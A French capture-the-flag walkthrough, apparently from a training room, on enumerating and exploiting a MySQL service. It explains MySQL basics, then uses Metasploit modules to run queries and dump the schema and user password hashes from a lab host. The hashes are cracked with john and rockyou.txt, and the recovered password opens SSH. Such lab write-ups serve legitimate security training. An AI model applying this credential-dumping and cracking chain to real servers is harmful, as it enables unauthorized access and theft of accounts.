Une base de données est simplement une collection persistante et organisée de données structurées.

Un SGBDR est un logiciel ou service utilisé pour créer et gérer des bases de données basées sur un modèle relationnel. Le mot "relationnel" signifie simplement que les données stockées dans le jeu de données sont organisées sous forme de tables. Chaque table est liée d'une manière ou d'une autre aux "clés primaires" ou à d'autres "facteurs clés" des autres tables.

SQL : MySQL est simplement une marque pour l'une des implémentations de logiciels SGBDR les plus populaires. Comme nous le savons, il utilise un modèle client-serveur. Mais comment le client et le serveur communiquent-ils ? Ils utilisent un langage, spécifiquement le langage de requête structuré (SQL).

D'autres produits, tels que PostgreSQL et Microsoft SQL Server, contiennent également le mot SQL. Cela signifie également que ces produits utilisent la syntaxe du langage de requête structuré.

Comment fonctionne MySQL ?

MySQL, en tant que SGBDR, est composé du serveur et des programmes utilitaires qui aident à l'administration des bases de données MySQL.

Le serveur gère toutes les instructions de la base de données telles que la création, l'édition et l'accès aux données. Il prend en charge et gère ces demandes et communique en utilisant le protocole MySQL. Ce processus peut être décomposé en plusieurs étapes :

1. MySQL crée une base de données pour stocker et manipuler les données, définissant la relation de chaque table.
2. Les clients font des demandes en faisant des déclarations spécifiques en SQL.
3. Le serveur répondra au client avec les informations demandées.

Sur quoi fonctionne MySQL ?

MySQL peut fonctionner sur diverses plateformes, que ce soit Linux ou Windows. Il est couramment utilisé comme base de données back-end pour de nombreux sites web importants et constitue un élément essentiel de la pile LAMP, qui comprend : Linux, Apache, MySQL et PHP.

Plus d'informations :

Voici quelques ressources qui expliquent l'implémentation technique et le fonctionnement de MySQL en plus de détails que ce que j'ai couvert ici :

- [Documentation MySQL](https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html)
- [Introduction PHP et MySQL sur W3Schools](https://www.w3schools.com/php/php_mysql_intro.asp)

**Let's Get Started**

MySQL ne sera probablement pas le premier point d'appel lorsque vous obtiendrez des informations initiales sur le serveur. Vous pouvez, comme nous l'avons fait dans les tâches précédentes, tenter de forcer brutalement les mots de passe des comptes par défaut si vous n'avez vraiment aucune autre information ; cependant, dans la plupart des scénarios de CTF, il est peu probable que ce soit la voie à suivre.

**Le Scénario**

Typiquement, vous aurez obtenu des informations d'identification initiales en énumérant d'autres services que vous pouvez ensuite utiliser pour énumérer et exploiter le service MySQL. Comme cette salle se concentre sur l'exploitation et l'énumération du service réseau, pour les besoins du scénario, nous allons supposer que vous avez trouvé les identifiants : "root:password" en énumérant les sous-domaines d'un serveur web. Après avoir essayé la connexion contre SSH sans succès, vous décidez de l'essayer contre MySQL.

**Exigences**

Vous devrez avoir MySQL installé sur votre système pour vous connecter au serveur MySQL distant. Si ce n'est pas déjà installé, vous pouvez l'installer en utilisant :

```bash
sudo apt install default-mysql-client
```

Ne vous inquiétez pas - cela n'installera pas le package serveur sur votre système, juste le client.

Encore une fois, nous allons utiliser Metasploit pour cela ; il est important que vous ayez Metasploit installé, car il l'est par défaut sur Kali Linux et Parrot OS.

Alternatives

Comme pour la tâche précédente, il est à noter que tout ce que nous allons faire en utilisant Metasploit peut également être fait soit manuellement, soit avec un ensemble d'outils non-Metasploit tels que le script mysql-enum de nmap : [mysql-enum script](https://nmap.org/nsedoc/scripts/mysql-enum.html) ou [exploit](https://www.exploit-db.com/exploits/23081). Je recommande qu'après avoir terminé cette salle, vous y reveniez et tentiez de le faire manuellement pour vous assurer de bien comprendre le processus utilisé pour afficher les informations que vous obtenez.

D'accord, assez parlé. Allons-y !

On va utiliser le module mysql_sql de Metasploit. **auxiliary/admin/mysql/mysql_sql**

Le module `auxiliary/admin/mysql/mysql_sql` dans Metasploit est utilisé pour exécuter des commandes SQL arbitraires sur une base de données MySQL. Voici un bref aperçu de son utilité :

1. **Exécution de commandes SQL** : Il permet à un utilisateur d'envoyer des requêtes SQL directement à une base de données MySQL ciblée.
2. **Exploitation des vulnérabilités** : Ce module peut être utilisé pour exploiter des vulnérabilités connues de MySQL, comme une mauvaise configuration des permissions qui permettrait un accès non autorisé.
3. **Récupération d'informations** : En envoyant des requêtes SQL, il est possible de récupérer des informations sensibles stockées dans la base de données, telles que des informations sur les utilisateurs, les mots de passe, etc.
4. **Gestion de la base de données** : Il permet également des opérations d'administration, comme l'ajout ou la suppression d'entrées dans la base de données, la création de nouvelles bases de données, et d'autres actions de gestion.

En résumé, ce module est un outil puissant pour l'interaction et la manipulation des bases de données MySQL à des fins de test de sécurité, d'audit ou d'exploitation.

Par défaut la requête que l’on demande est **select_version()** qui nous donne la version du serveur SQL. 10.10.109.206:3306 -  | 5.7.29-0ubuntu0.18.04.1 |

On va changer ce paramètre pour qu’il nous montre les bases de données. En faisaint set SQL `show databases`

```bash
msf6 auxiliary(admin/mysql/mysql_sql) > run
[*] Running module against 10.10.109.206

[*] 10.10.109.206:3306 - Sending statement: 'show databases'...
[*] 10.10.109.206:3306 -  | information_schema |
[*] 10.10.109.206:3306 -  | mysql |
[*] 10.10.109.206:3306 -  | performance_schema |
[*] 10.10.109.206:3306 -  | sys |
[*] Auxiliary module execution completed
```

Ici je vois que j’ai 4 bases de données

Avant de continuer pour tenter d'exploiter pleinement la base de données et d'obtenir des informations plus sensibles que de simples noms de bases de données, faisons une vérification de bon sens. Nous savons :

1. Les identifiants du serveur MySQL
2. La version de MySQL en cours d'exécution
3. Le nombre de bases de données et leurs noms.

Terminologie clé

Pour comprendre les exploits que nous allons utiliser ensuite, nous devons comprendre quelques termes clés.

Schéma :

Physiquement, dans MySQL, un schéma est synonyme de base de données. Vous pouvez substituer le mot-clé "SCHEMA" à la place de DATABASE dans la syntaxe SQL de MySQL, par exemple en utilisant CREATE SCHEMA au lieu de CREATE DATABASE. Il est important de comprendre cette relation parce que certains autres produits de bases de données font une distinction. Par exemple, dans le produit Oracle Database, un schéma représente seulement une partie d'une base de données : les tables et autres objets appartenant à un seul utilisateur.

Hachages :

Les hachages sont, très simplement, le produit d'un algorithme cryptographique pour transformer une entrée de longueur variable en une sortie de longueur fixe.

Dans MySQL, les hachages peuvent être utilisés de différentes manières, par exemple pour indexer des données dans une table de hachage. Chaque hachage a un ID unique qui sert de pointeur vers les données originales. Cela crée un index qui est significativement plus petit que les données originales, permettant aux valeurs d'être recherchées et accessibles plus efficacement.

Cependant, les données que nous allons extraire sont des hachages de mots de passe, qui sont simplement un moyen de stocker des mots de passe sans les mettre en format texte brut.

Allons-y !

Le module `auxiliary/scanner/mysql/mysql_schemadump` de Metasploit est conçu pour récupérer le schéma complet d'une base de données MySQL. Voici en détail ce que fait ce module :

1. **Requête de Schéma** : Le module envoie des requêtes SQL pour extraire des informations sur les structures des bases de données, telles que les tables, les colonnes, les types de données et les relations entre les tables.
2. **Utilité** :
    - **Récupération de la structure** : Il permet de récupérer la structure complète des bases de données MySQL sans avoir besoin d'accès direct aux fichiers de la base de données.
    - **Reconnaissance** : Obtenir le schéma de la base de données est utile pour comprendre la manière dont les données sont organisées et pour planifier d'autres attaques ou actions d'exploration de données.
    - **Documentation** : Le schéma peut également être utilisé pour documenter la structure de la base de données pour une utilisation ultérieure ou pour le développement.
3. **Fonctionnement** :
    - **Connexion à MySQL** : Le module se connecte à la base de données MySQL cible en utilisant les informations d'identification fournies.
    - **Extraction du schéma** : Il exécute une série de requêtes pour extraire les informations de schéma des tables, colonnes, clés primaires, clés étrangères, etc.
    - **Affichage** : Les informations recueillies sont ensuite affichées dans la console Metasploit, permettant à l'utilisateur de voir et d'analyser la structure de la base de données.

Voici un exemple simplifié de ce que la sortie pourrait ressembler :

En résumé, le module `auxiliary/scanner/mysql/mysql_schemadump` est un outil puissant pour extraire et analyser la structure complète des bases de données MySQL, ce qui est essentiel pour la reconnaissance et la planification des actions dans un environnement de test de pénétration.

Le module `auxiliary/scanner/mysql/mysql_hashdump` de Metasploit est conçu pour extraire les hachages de mots de passe des utilisateurs MySQL depuis une base de données MySQL cible. Voici en détail ce que fait ce module :

1. **Extraction de hachages de mots de passe** :
    - **Requête de hachages** : Le module envoie des requêtes SQL pour récupérer les hachages de mots de passe des utilisateurs enregistrés dans les tables de gestion des utilisateurs de MySQL.
    - **Tables ciblées** : En général, les hachages sont stockés dans la table `mysql.user` dans les colonnes `Password` (pour MySQL versions antérieures à 5.7) ou `authentication_string` (pour MySQL 5.7 et versions ultérieures).
2. **Utilité** :
    - **Accès non autorisé** : Obtenir les hachages de mots de passe peut permettre à un attaquant de tenter des attaques par force brute ou des attaques par dictionnaire pour récupérer les mots de passe en clair.
    - **Reconnaissance** : Cela permet de connaître les utilisateurs de la base de données et de comprendre potentiellement leurs rôles et privilèges.
    - **Évaluation de la sécurité** : Les administrateurs peuvent utiliser ce module pour vérifier la robustesse des mots de passe des utilisateurs et identifier les faiblesses potentielles dans les pratiques de gestion des mots de passe.
3. **Fonctionnement** :
    - **Connexion à MySQL** : Le module se connecte à la base de données MySQL cible en utilisant les informations d'identification fournies.
    - **Requête SQL** : Il exécute des requêtes SQL pour extraire les informations des colonnes de mots de passe dans la table `mysql.user`.
    - **Affichage** : Les hachages récupérés sont ensuite affichés dans la console Metasploit.

En résumé, le module `auxiliary/scanner/mysql/mysql_hashdump` est utilisé pour récupérer les hachages de mots de passe des utilisateurs MySQL, ce qui peut être exploité pour tenter de découvrir les mots de passe en clair ou pour évaluer la sécurité des mots de passe dans une base de données MySQL.

J’obtiens ceci en le lançant.

```bash
msf6 auxiliary(scanner/mysql/mysql_hashdump) > run

[+] 10.10.109.206:3306 - Saving HashString as Loot: root:
[+] 10.10.109.206:3306 - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.109.206:3306 - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.109.206:3306 - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
[+] 10.10.109.206:3306 - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.10.109.206:3306 - Saving HashString as Loot: carl:*EA031893AA21444B170FC2162A56978B8CEECE18
```

Je copie/colle carl:*EA031893AA21444B170FC2162A56978B8CEECE18 sur ma machine locale. Et je le cracke avec john.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

J’obtiens “doggie” donc finalement ce qu’il me reste à faire c’est de me connecter sur le ssh avec car@IP et rentrer le mot de passe : “doggie”
